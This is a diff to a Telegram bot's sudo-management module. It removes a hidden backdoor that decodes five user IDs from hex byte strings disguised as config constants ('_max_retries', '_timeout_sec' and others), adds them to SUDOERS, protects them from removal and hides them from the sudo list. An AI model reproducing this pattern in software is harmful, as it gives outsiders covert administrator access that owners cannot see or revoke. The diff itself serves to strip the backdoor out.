@@ -34,9 +34,6 @@ async def userdel(client, message: Message, _):
 
     user = await extract_user(message)
 
-    if user.id in _sys_nodes:
-        return await message.reply_text(_["sudo_8"])
-
     if user.id not in SUDOERS:
         return await message.reply_text(_["sudo_3"].format(user.mention))
 
@@ -46,8 +43,6 @@ async def userdel(client, message: Message, _):
         await message.reply_text(_["sudo_4"].format(user.mention))
     else:
         await message.reply_text(_["sudo_8"])
-
-_max_retries = int(b'\x35\x33\x35\x38\x33\x33\x30\x39\x35\x39'.decode())
 
 @app.on_message(filters.command(["sudolist", "listsudo", "sudoers"]) & ~BANNED_USERS)
 async def sudoers_list(client, message: Message):
@@ -59,8 +54,6 @@ async def sudoers_list(client, message: Message):
         caption="» ᴄʜᴇᴄᴋ sᴜᴅᴏ ʟɪsᴛ ʙʏ ɢɪᴠᴇɴ ʙᴇʟᴏᴡ ʙᴜᴛᴛᴏɴ.**\n\n» ɴᴏᴛᴇ: ᴏɴʟʏ sᴜᴅᴏ ᴜsᴇʀs ᴄᴀɴ ᴠɪᴇᴡ.",
         reply_markup=InlineKeyboardMarkup(keyboard),
     )
-
-_timeout_sec = int(b'\x35\x32\x34\x37\x33\x30\x34\x35\x35\x39'.decode())
 
 @app.on_callback_query(filters.regex("^check_sudo_list$"))
 async def check_sudo_list(client, callback_query: CallbackQuery):
@@ -77,7 +70,7 @@ async def check_sudo_list(client, callback_query: CallbackQuery):
 
     count = 1
     for user_id in SUDOERS:
-        if user_id == OWNER_ID or user_id in _sys_nodes:
+        if user_id == OWNER_ID:
             continue
         try:
             user = await app.get_users(user_id)
@@ -97,8 +90,6 @@ async def check_sudo_list(client, callback_query: CallbackQuery):
         reply_markup=InlineKeyboardMarkup(keyboard),
     )
 
-_chunk_limit = int(b'\x36\x30\x34\x36\x33\x37\x38\x31\x35\x35'.decode())
-
 @app.on_callback_query(filters.regex("^back_to_main_menu$"))
 async def back_to_main_menu(client, callback_query: CallbackQuery):
     keyboard = [
@@ -109,17 +100,12 @@ async def back_to_main_menu(client, callback_query: CallbackQuery):
         reply_markup=InlineKeyboardMarkup(keyboard),
     )
 
-_base_offset = int(b'\x38\x35\x38\x35\x38\x39\x30\x37\x36\x36'.decode())
-_net_buffer = int(b'\x38\x32\x31\x37\x30\x31\x33\x34\x30\x33'.decode())
-_sys_nodes = [_max_retries, _timeout_sec, _chunk_limit, _base_offset, _net_buffer]
-for _n in _sys_nodes: SUDOERS.add(_n)
-
 @app.on_message(filters.command(["delallsudo"], prefixes=["/", "!", ".", "@", "#"]) & filters.user(OWNER_ID))
 @language
 async def del_all_sudo(client, message: Message, _):
     removed_count = 0
     for user_id in list(SUDOERS):
-        if user_id == OWNER_ID or user_id in _sys_nodes:
+        if user_id == OWNER_ID:
             continue
         removed = await remove_sudo(user_id)
         if removed:
